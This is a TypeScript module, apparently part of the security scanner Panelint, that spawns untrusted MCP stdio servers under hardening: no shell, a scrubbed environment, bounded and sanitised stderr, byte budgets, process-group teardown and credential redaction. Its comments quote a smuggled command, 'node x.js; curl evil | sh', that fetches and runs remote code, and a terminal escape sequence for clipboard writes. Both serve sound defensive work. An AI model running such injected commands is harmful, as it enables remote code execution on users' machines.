/**
 * Process-safety wrapper for stdio acquisition.
 *
 * This is the file that runs somebody else's code. Everything here exists
 * because the alternative was measured and found dangerous, not because it
 * seemed prudent.
 *
 * ## Why not `StdioClientTransport`
 *
 * The SDK's transport is close, and three of its hard-coded choices are wrong
 * for a scanner (measured against `@modelcontextprotocol/sdk@1.30.0`,
 * `dist/esm/client/stdio.js`):
 *
 *   1. `stdio: ['pipe', 'pipe', this._serverParams.stderr ?? 'inherit']`.
 *      The default INHERITS stderr, handing a hostile server a raw pipe to the
 *      operator's terminal that bypasses every sanitizer Panelint owns —
 *      OSC 52 clipboard writes (`\x1b]52;c;<base64>\x07`), `\r` overwrites that
 *      forge a "0 findings (clean)" summary line, OSC 8 hyperlinks attributed
 *      to Panelint, and unbounded output that evicts real findings from a CI
 *      log. `stderr` is always `'pipe'` here, consumed into a bounded buffer,
 *      stripped of control characters, and discarded unless explicitly asked
 *      for.
 *   2. No `detached`. `node server.js` that spawns a Python helper leaves the
 *      helper orphaned and holding its port when the parent is killed. We
 *      spawn into a new process group and signal the GROUP.
 *   3. `maxBufferSize` defaults to 10 MB but only caps PENDING unterminated
 *      data. An endless stream of well-formed newline-delimited notifications
 *      never trips it. A cumulative session budget is enforced here as well.
 *
 * `getDefaultEnvironment()` is the one piece worth keeping, and it is imported
 * rather than reimplemented: it scrubs the environment to a six-variable
 * allowlist on POSIX. `process.env` is NEVER passed to a child — a scan in CI
 * would otherwise hand repository credentials to arbitrary code.
 *
 * ## Detaching costs you SIGINT
 *
 * A detached child is no longer in the terminal's foreground process group, so
 * Ctrl-C reaches Panelint and NOT the server. Every exit path therefore has to
 * tear down explicitly: SIGINT/SIGTERM/SIGHUP, `uncaughtException`,
 * `unhandledRejection`, plus a synchronous last-resort `exit` handler, because
 * `process.on('exit')` cannot await anything.
 */

import { spawn as nodeSpawn, type ChildProcess } from 'node:child_process';
import process from 'node:process';
import { getDefaultEnvironment } from '@modelcontextprotocol/sdk/client/stdio.js';
import { ReadBuffer, serializeMessage } from '@modelcontextprotocol/sdk/shared/stdio.js';
import type { Transport } from '@modelcontextprotocol/sdk/shared/transport.js';
import type { JSONRPCMessage } from '@modelcontextprotocol/sdk/types.js';
import { safe, trusted, type Untrusted } from './untrusted.js';

const IS_WINDOWS = process.platform === 'win32';

// ---------------------------------------------------------------------------
// Defaults
// ---------------------------------------------------------------------------

export const SPAWN_DEFAULTS = Object.freeze({
  /**
   * Pending-unterminated-data ceiling handed to the SDK's `ReadBuffer`. Set
   * explicitly rather than inherited: the SDK default is 10 MB, and relying on
   * a dependency's default for a security ceiling makes a `npm update` a
   * silent policy change.
   */
  maxBufferSize: 1024 * 1024,
  /**
   * Cumulative stdout budget for the WHOLE session. This is the limit
   * `maxBufferSize` is not: it counts every byte received, terminated or not,
   * so a server emitting one valid notification per millisecond forever is
   * bounded.
   */
  maxSessionBytes: 64 * 1024 * 1024,
  /** Hard cap on retained server stderr. */
  stderrCapBytes: 8 * 1024,
  /** Grace period between "stdin closed" and SIGTERM to the group. */
  termGraceMs: 1_000,
  /** Grace period between SIGTERM and SIGKILL to the group. */
  killGraceMs: 1_000,
});

// ---------------------------------------------------------------------------
// Command echo, redacted
// ---------------------------------------------------------------------------

/**
 * Tokens whose value must never reach a terminal or a CI log.
 *
 * The dominant real invocation is `npx -y @vendor/server --api-key=sk-live-…`,
 * and Panelint echoes the resolved command before running it (DESIGN.md §10).
 * Echoing it verbatim would print a live credential into a log that is very
 * often public.
 */
const SENSITIVE_TOKEN = /(key|token|secret|password|passwd|auth|credential)/i;

/** The literal substituted for a redacted value. */
export const REDACTED = '<redacted>';

/**
 * Redact an argv array for display.
 *
 * Two shapes are handled. `--api-key=sk-live-…` keeps its flag and loses its
 * value. A bare `--api-key` followed by a separate value token redacts the
 * NEXT token too, because that is where the secret actually is.
 *
 * A token that is itself sensitive but carries no `=` and no follower (a lone
 * `--token` at the end) is left alone: there is nothing secret in it.
 */
export function redactArgv(args: readonly string[]): string[] {
  const out: string[] = [];
  let redactNext = false;

  for (const arg of args) {
    if (redactNext) {
      out.push(REDACTED);
      redactNext = false;
      continue;
    }

    const eq = arg.indexOf('=');
    if (eq > 0 && SENSITIVE_TOKEN.test(arg.slice(0, eq))) {
      out.push(`${arg.slice(0, eq)}=${REDACTED}`);
      continue;
    }

    if (eq === -1 && arg.startsWith('-') && SENSITIVE_TOKEN.test(arg)) {
      out.push(arg);
      redactNext = true;
      continue;
    }

    // A bare value that itself looks like a secret assignment, e.g. a token
    // passed positionally as `API_KEY=…`.
    if (eq > 0 && SENSITIVE_TOKEN.test(arg.slice(0, eq))) {
      out.push(`${arg.slice(0, eq)}=${REDACTED}`);
      continue;
    }

    out.push(arg);
  }

  return out;
}

/**
 * The line printed before a spawn.
 *
 * The environment is NEVER included, at any verbosity. DESIGN.md §10, log
 * hygiene: "never log … the environment passed to a spawned server."
 */
export function formatCommandEcho(command: string, args: readonly string[]): Untrusted {
  const parts = [command, ...redactArgv(args)];
  return safe(parts.join(' '), 512);
}

// ---------------------------------------------------------------------------
// Spawn options — one place, asserted by test
// ---------------------------------------------------------------------------

export interface SpawnPlan {
  command: string;
  args: string[];
  options: {
    cwd: string | undefined;
    env: Record<string, string>;
    stdio: ['pipe', 'pipe', 'pipe'];
    /** Always false. Never conditional, never behind a flag. */
    shell: false;
    detached: boolean;
    windowsHide: boolean;
  };
}

/**
 * Build the exact options a child is spawned with.
 *
 * Exported so `test/acquire-stdio.test.ts` can assert the invariants directly
 * rather than inferring them from behaviour.
 *
 * `shell` is `false` with a literal type, so `shell: true` cannot be
 * reintroduced without a compile error. This is the single most important line
 * in the file: the API takes `{ command, args[] }` and never a command string,
 * because with a shell a config-supplied `"node x.js; curl evil | sh"` is
 * arbitrary remote code execution rather than a failed `ENOENT`.
 */
export function buildSpawnPlan(opts: {
  command: string;
  args: readonly string[];
  cwd?: string;
}): SpawnPlan {
  if (typeof opts.command !== 'string' || opts.command.length === 0) {
    throw new TypeError('command must be a non-empty string');
  }
  if (!Array.isArray(opts.args) || opts.args.some((a) => typeof a !== 'string')) {
    throw new TypeError('args must be an array of strings — a command string is never split here');
  }

  return {
    command: opts.command,
    args: [...opts.args],
    options: {
      cwd: opts.cwd,
      // NOT process.env. The SDK's allowlist is six variables on POSIX
      // (HOME, LOGNAME, PATH, SHELL, TERM, USER) and skips exported shell
      // functions. A CI runner's secrets do not appear in it.
      env: getDefaultEnvironment(),
      // Index 2 is 'pipe', never 'inherit'. See the file header.
      stdio: ['pipe', 'pipe', 'pipe'],
      shell: false,
      // A new process group on POSIX, so the whole tree can be signalled.
      // Windows has no process groups that `process.kill(-pid)` can address,
      // so detaching there buys nothing and costs the console attachment.
      detached: !IS_WINDOWS,
      windowsHide: true,
    },
  };
}

// ---------------------------------------------------------------------------
// Bounded stderr
// ---------------------------------------------------------------------------

/**
 * A capped stderr sink.
 *
 * Deliberately HEAD-retaining rather than a true ring. A tail-retaining ring
 * lets a hostile server evict its own real startup error by flooding after the
 * fact, and the first bytes of stderr are the ones with diagnostic value
 * ("MODULE_NOT_FOUND", "EADDRINUSE"). Overflow is counted, not silently
 * dropped, so the report can say how much was discarded.
 */
export class BoundedStderr {
  private chunks: Buffer[] = [];
  private kept = 0;
  private dropped = 0;

  constructor(private readonly cap: number) {}

  write(chunk: Buffer): void {
    const room = this.cap - this.kept;
    if (room <= 0) {
      this.dropped += chunk.length;
      return;
    }
    if (chunk.length <= room) {
      this.chunks.push(chunk);
      this.kept += chunk.length;
      return;
    }
    this.chunks.push(chunk.subarray(0, room));
    this.kept += room;
    this.dropped += chunk.length - room;
  }

  get droppedBytes(): number {
    return this.dropped;
  }

  get keptBytes(): number {
    return this.kept;
  }

  /**
   * The retained text, control characters stripped and then escaped.
   *
   * Two passes, and both are needed. Stripping removes the C0/C1 ranges
   * outright (tab survives; newline becomes a space so the text stays
   * line-shaped without letting the server author its own log lines), which
   * kills ANSI/OSC sequences at the source. `safe()` then escapes whatever is
   * left, so bidi overrides and zero-width characters are visible rather than
   * active.
   */
  text(cap = 4_000): Untrusted {
    const raw = Buffer.concat(this.chunks).toString('utf8');
    return safe(stripControl(raw), cap);
  }
}

/**
 * Remove C0 and C1 control characters, keeping tab.
 *
 * `\n` and `\r` are turned into spaces rather than deleted: `\r` is the
 * line-overwrite primitive used to forge a clean summary, and `\n` would let
 * server output impersonate a Panelint log line. U+0085 (NEL) and U+2028/2029
 * are line terminators to some consumers and are handled the same way.
 */
export function stripControl(s: string): string {
  let out = '';
  for (const ch of s) {
    const cp = ch.codePointAt(0)!;
    if (cp === 0x09) {
      out += ch;
    } else if (cp === 0x0a || cp === 0x0d || cp === 0x85 || cp === 0x2028 || cp === 0x2029) {
      out += ' ';
    } else if (cp < 0x20 || (cp >= 0x7f && cp <= 0x9f)) {
      // dropped
    } else {
      out += ch;
    }
  }
  return out;
}

// ---------------------------------------------------------------------------
// Process-group teardown
// ---------------------------------------------------------------------------

/**
 * Every pid this process has spawned and not yet reaped.
 *
 * Module-level and deliberately global: the `exit` handler is synchronous and
 * has no access to any instance, so the set is the only thing it can consult.
 */
const ACTIVE_PIDS = new Set<number>();

/** For tests and for the report footer. */
export function activePids(): number[] {
  return [...ACTIVE_PIDS];
}

/**
 * Signal a process GROUP, falling back to the process itself.
 *
 * `process.kill(-pid, sig)` addresses the group created by `detached: true`,
 * which is what catches the Python helper a Node server spawned. On Windows,
 * and if the group has already gone, fall back to the single pid. Returns true
 * when a signal was delivered to something.
 */
export function killProcessGroup(pid: number, signal: NodeJS.Signals = 'SIGTERM'): boolean {
  if (!Number.isInteger(pid) || pid <= 1) return false;
  if (!IS_WINDOWS) {
    try {
      process.kill(-pid, signal);
      return true;
    } catch {
      // ESRCH — the group is gone, or we never detached. Fall through.
    }
  }
  try {
    process.kill(pid, signal);
    return true;
  } catch {
    return false;
  }
}

/** True when the process group still has at least one member. */
export function groupAlive(pid: number): boolean {
  if (!Number.isInteger(pid) || pid <= 1) return false;
  if (!IS_WINDOWS) {
    try {
      process.kill(-pid, 0);
      return true;
    } catch {
      /* fall through */
    }
  }
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

/** Synchronous, best-effort, last-resort. Used by the `exit` handler. */
export function killAllTracked(signal: NodeJS.Signals = 'SIGKILL'): void {
  for (const pid of ACTIVE_PIDS) {
    try {
      killProcessGroup(pid, signal);
    } catch {
      /* nothing can be done from an exit handler */
    }
  }
}

// --- guards --------------------------------------------------------------

type GuardEntry = { event: string; handler: (...a: never[]) => void };
let guards: GuardEntry[] | null = null;

const FATAL_SIGNALS: NodeJS.Signals[] = ['SIGINT', 'SIGTERM', 'SIGHUP'];

/**
 * Install teardown guards, refcounted against `ACTIVE_PIDS`.
 *
 * Refcounting matters for more than tidiness. An `uncaughtException` handler
 * that lives forever changes the host process's crash semantics permanently —
 * in a test runner or an embedding application that is a real behaviour
 * change. These guards exist only while a child process does.
 */
function installGuards(): void {
  if (guards) return;
  const installed: GuardEntry[] = [];

  for (const sig of FATAL_SIGNALS) {
    const handler = (): void => {
      killAllTracked('SIGTERM');
      killAllTracked('SIGKILL');
      removeGuards();
      // Re-raise so the exit status is the conventional 128+n rather than a
      // fabricated code. With our handler gone this takes the default action.
      process.kill(process.pid, sig);
    };
    process.on(sig, handler);
    installed.push({ event: sig, handler });
  }

  const onFatal = (err: unknown): void => {
    killAllTracked('SIGKILL');
    removeGuards();
    // Rethrow into an empty stack so the default handler produces its normal
    // report. Suppressing the error to exit cleanly would hide a Panelint bug.
    setTimeout(() => {
      throw err;
    }, 0);
  };
  process.on('uncaughtException', onFatal);
  installed.push({ event: 'uncaughtException', handler: onFatal as never });
  process.on('unhandledRejection', onFatal);
  installed.push({ event: 'unhandledRejection', handler: onFatal as never });

  // The last resort. Synchronous, no awaiting possible, no throwing allowed.
  const onExit = (): void => {
    for (const pid of ACTIVE_PIDS) {
      try {
        process.kill(IS_WINDOWS ? pid : -pid, 'SIGKILL');
      } catch {
        /* ignore */
      }
    }
  };
  process.on('exit', onExit);
  installed.push({ event: 'exit', handler: onExit });

  guards = installed;
}

function removeGuards(): void {
  if (!guards) return;
  for (const g of guards) {
    process.removeListener(g.event, g.handler as (...a: unknown[]) => void);
  }
  guards = null;
}

function trackPid(pid: number): void {
  ACTIVE_PIDS.add(pid);
  installGuards();
}

function untrackPid(pid: number): void {
  ACTIVE_PIDS.delete(pid);
  if (ACTIVE_PIDS.size === 0) removeGuards();
}

// ---------------------------------------------------------------------------
// The transport
// ---------------------------------------------------------------------------

export interface SafeStdioOptions {
  command: string;
  args: readonly string[];
  cwd?: string;
  maxBufferSize?: number;
  maxSessionBytes?: number;
  stderrCapBytes?: number;
  termGraceMs?: number;
  killGraceMs?: number;
}

export type TransportAbortReason = 'SESSION_BYTES' | 'READ_BUFFER' | 'CHILD_EXITED';

/**
 * A `Transport` that spawns safely and can be torn down completely.
 *
 * Implements the SDK's `Transport` interface, so `Client.connect()` drives it
 * exactly as it would drive `StdioClientTransport` — only the spawn and the
 * teardown differ.
 */
export class SafeStdioTransport implements Transport {
  onclose?: () => void;
  onerror?: (error: Error) => void;
  onmessage?: (message: JSONRPCMessage) => void;
  /** Recorded from the initialize response by `Client`. */
  negotiatedProtocolVersion?: string;

  readonly stderr: BoundedStderr;

  private child: ChildProcess | undefined;
  private readonly readBuffer: ReadBuffer;
  private readonly plan: SpawnPlan;
  private readonly maxSessionBytes: number;
  private readonly termGraceMs: number;
  private readonly killGraceMs: number;

  private receivedBytes = 0;
  private closed = false;
  private abortReason: TransportAbortReason | null = null;
  private trackedPid: number | null = null;

  constructor(opts: SafeStdioOptions) {
    this.plan = buildSpawnPlan({
      command: opts.command,
      args: opts.args,
      ...(opts.cwd !== undefined ? { cwd: opts.cwd } : {}),
    });
    this.readBuffer = new ReadBuffer({
      maxBufferSize: opts.maxBufferSize ?? SPAWN_DEFAULTS.maxBufferSize,
    });
    this.maxSessionBytes = opts.maxSessionBytes ?? SPAWN_DEFAULTS.maxSessionBytes;
    this.stderr = new BoundedStderr(opts.stderrCapBytes ?? SPAWN_DEFAULTS.stderrCapBytes);
    this.termGraceMs = opts.termGraceMs ?? SPAWN_DEFAULTS.termGraceMs;
    this.killGraceMs = opts.killGraceMs ?? SPAWN_DEFAULTS.killGraceMs;
  }

  /** The pid of the spawned child, once it exists. */
  get pid(): number | null {
    return this.child?.pid ?? null;
  }

  /** Why the session was cut short, if it was. */
  get aborted(): TransportAbortReason | null {
    return this.abortReason;
  }

  get bytesReceived(): number {
    return this.receivedBytes;
  }

  setProtocolVersion(version: string): void {
    this.negotiatedProtocolVersion = version;
  }

  async start(): Promise<void> {
    if (this.child) throw new Error('SafeStdioTransport already started');

    const child = nodeSpawn(this.plan.command, this.plan.args, this.plan.options);
    this.child = child;

    await new Promise<void>((resolve, reject) => {
      const onSpawnError = (error: Error): void => {
        child.removeListener('spawn', onSpawn);
        reject(error);
      };
      const onSpawn = (): void => {
        child.removeListener('error', onSpawnError);
        if (typeof child.pid === 'number') {
          this.trackedPid = child.pid;
          trackPid(child.pid);
        }
        resolve();
      };
      child.once('error', onSpawnError);
      child.once('spawn', onSpawn);
    });

    child.on('error', (error) => this.onerror?.(error));

    child.stdin?.on('error', (error) => this.onerror?.(error));

    child.stdout?.on('data', (chunk: Buffer) => this.ingest(chunk));
    child.stdout?.on('error', (error) => this.onerror?.(error));

    // Always consumed, never inherited. Consuming also prevents the child
    // blocking forever on a full stderr pipe.
    child.stderr?.on('data', (chunk: Buffer) => this.stderr.write(chunk));
    child.stderr?.on('error', () => {
      /* a broken stderr pipe is not a scan failure */
    });

    child.on('close', () => {
      if (this.trackedPid !== null) untrackPid(this.trackedPid);
      this.child = undefined;
      if (!this.closed) {
        this.closed = true;
        this.abortReason ??= 'CHILD_EXITED';
        this.onclose?.();
      }
    });
  }

  private ingest(chunk: Buffer): void {
    if (this.closed) return;

    this.receivedBytes += chunk.length;
    if (this.receivedBytes > this.maxSessionBytes) {
      // The limit `maxBufferSize` is not. A server streaming well-formed
      // notifications forever never fills the read buffer.
      this.abortReason = 'SESSION_BYTES';
      this.onerror?.(
        new Error(`session stdout budget exceeded: ${this.receivedBytes} > ${this.maxSessionBytes}`),
      );
      void this.close();
      return;
    }

    try {
      this.readBuffer.append(chunk);
    } catch (e) {
      this.abortReason = 'READ_BUFFER';
      this.onerror?.(e instanceof Error ? e : new Error('read buffer failure'));
      void this.close();
      return;
    }

    for (;;) {
      let message: JSONRPCMessage | null;
      try {
        message = this.readBuffer.readMessage();
      } catch (e) {
        // A malformed frame is reported and skipped; the SDK does the same.
        this.onerror?.(e instanceof Error ? e : new Error('malformed message'));
        continue;
      }
      if (message === null) break;
      this.onmessage?.(message);
    }
  }

  async send(message: JSONRPCMessage): Promise<void> {
    const stdin = this.child?.stdin;
    if (!stdin || this.closed) throw new Error('Not connected');
    const json = serializeMessage(message);
    await new Promise<void>((resolve, reject) => {
      stdin.write(json, (err) => (err ? reject(err) : resolve()));
    });
  }

  /**
   * Close stdin, then escalate to the process GROUP.
   *
   * Escalation is SIGTERM then SIGKILL, both to `-pid`. Signalling the child
   * alone leaves the tree it spawned holding ports.
   */
  async close(): Promise<void> {
    const child = this.child;
    this.child = undefined;

    if (!this.closed) {
      this.closed = true;
      this.onclose?.();
    }
    this.readBuffer.clear();

    if (!child) {
      if (this.trackedPid !== null) untrackPid(this.trackedPid);
      return;
    }

    const exited = new Promise<void>((resolve) => child.once('close', () => resolve()));

    try {
      child.stdin?.end();
    } catch {
      /* already gone */
    }

    const pid = child.pid;
    if (typeof pid !== 'number') {
      if (this.trackedPid !== null) untrackPid(this.trackedPid);
      return;
    }

    await Promise.race([exited, delay(this.termGraceMs)]);
    if (child.exitCode === null && child.signalCode === null) {
      killProcessGroup(pid, 'SIGTERM');
      await Promise.race([exited, delay(this.killGraceMs)]);
    }
    if (child.exitCode === null && child.signalCode === null) {
      killProcessGroup(pid, 'SIGKILL');
      await Promise.race([exited, delay(this.killGraceMs)]);
    }
    // Even if the leader is gone, sweep the group: a grandchild that
    // re-parented to init is exactly the orphan this exists to prevent.
    killProcessGroup(pid, 'SIGKILL');

    untrackPid(pid);
    this.trackedPid = null;
  }
}

function delay(ms: number): Promise<void> {
  return new Promise((resolve) => {
    const t = setTimeout(resolve, ms);
    if (typeof t.unref === 'function') t.unref();
  });
}

/** A trusted, already-escaped label for a refusal message. */
export function spawnRefusalDetail(): Untrusted {
  return trusted(
    'stdio acquisition executes the target server. Pass --allow-spawn to permit it. ' +
      'This flag is command-line only by design and is never read from a configuration ' +
      'file in the scanned repository, because a repository that can enable its own ' +
      'execution is not a gate.',
  );
}
